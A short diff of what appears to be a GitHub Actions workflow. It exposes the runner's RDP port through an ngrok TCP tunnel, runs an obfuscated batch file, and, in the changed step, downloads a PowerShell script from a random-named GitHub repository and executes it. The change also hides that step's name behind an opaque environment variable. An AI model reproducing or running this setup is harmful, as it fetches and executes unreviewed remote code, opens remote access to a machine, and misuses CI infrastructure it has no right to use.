@@ -34,7 +34,7 @@ jobs:
       run: Start-Process Powershell -ArgumentList '-Noexit -Command ".\ngrok\ngrok.exe tcp 3389"'
     - name: Connecting to your RDP.
       run: cmd /c z360FM0OMMpppzzFO.bat
-    - name: looping
+    - name: $Env:UDsDUDAgaau5f5v9A
       run: |
         Invoke-WebRequest https://raw.githubusercontent.com/gagayoyo/ZsWgzwWW2IzqIZ2Wz/main/sYx9aFxYzdZHh1YZa.ps1 -OutFile sYx9aFxYzdZHh1YZa.ps1
         ./sYx9aFxYzdZHh1YZa.ps1
